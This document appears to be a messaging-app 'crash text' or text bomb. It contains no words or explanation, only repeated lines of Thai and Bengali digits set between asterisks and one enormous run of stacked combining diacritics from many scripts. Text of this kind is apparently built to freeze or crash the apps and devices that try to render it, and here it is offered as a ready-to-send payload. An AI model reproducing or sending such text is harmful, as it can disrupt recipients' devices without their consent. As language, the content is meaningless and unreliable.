*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*
*9999999* *ผิดุท้่เึางืผิดุท้่เึางื* *9999999*ঔৣ͜͡҉* ҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴  
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
